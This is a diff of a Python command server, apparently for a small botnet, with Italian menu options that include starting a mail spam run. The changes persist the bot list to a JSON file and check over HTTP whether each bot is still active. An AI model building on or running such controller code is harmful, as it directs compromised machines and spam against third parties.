@@ -6,21 +6,24 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 
-server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
+# server_address = ('10.0.2.15', 15200)
+server_address = ('localhost', 15200)
 clients = []
 
 
-def write_on_json_file(data):
+def write_on_json_file():
     with open("bot-db.json", "w") as f:
-        json.dump(data, f)
+        print(clients)
+        json.dump(clients, f)
 
 
 def initialize_bot_list():
     with open("bot-db.json", "r") as f:
-        data = json.load(f)
-        for client in data:
-            clients.append((client[0], client[1]))
+        if data := json.load(f):
+            for client in data:
+                print(client)
+                if check_bot_is_active(client):
+                    clients.append((client[0], client[1]))
 
 
 def initialize(e):
@@ -45,8 +48,6 @@ def initialize(e):
 
             if bot not in clients:
                 clients.append(bot)
-
-                # write_on_json_file(clients)
 
         except socket.timeout:
             continue
@@ -79,12 +80,12 @@ def handle_console(e):
         print("4. Mostra informazioni di un client")
         print("5. Avvia mail spam")
         print("6. Controlla lo stato dei bot")
-        print("7. Verifica se i bot sono attivi")
         print("0. Exit")
         scelta = int(input())
 
         if scelta == 0:
             print("Exiting...")
+            write_on_json_file()
             e.set()
             return
         elif scelta == 1:
@@ -99,8 +100,6 @@ def handle_console(e):
             mail_spam()
         elif scelta == 6:
             bot_status()
-        elif scelta == 7:
-            check_bot_is_active()
         else:
             print("Scelta non valida")
 
@@ -227,14 +226,12 @@ def bot_status():
             clients.remove(client)
 
 
-def check_bot_is_active():
-    for client in clients:
-        try:
-            requests.get(f"http://{client}/status")
-            print(f"Bot: {client} attivo")
-        except requests.exceptions.ConnectionError:
-            print(f"Bot {client} disconnesso")
-            clients.remove(client)
+def check_bot_is_active(client):
+    try:
+        requests.get(f"http://{client}/status")
+        return True
+    except requests.exceptions.ConnectionError:
+        return False
 
 
 if __name__ == '__main__':
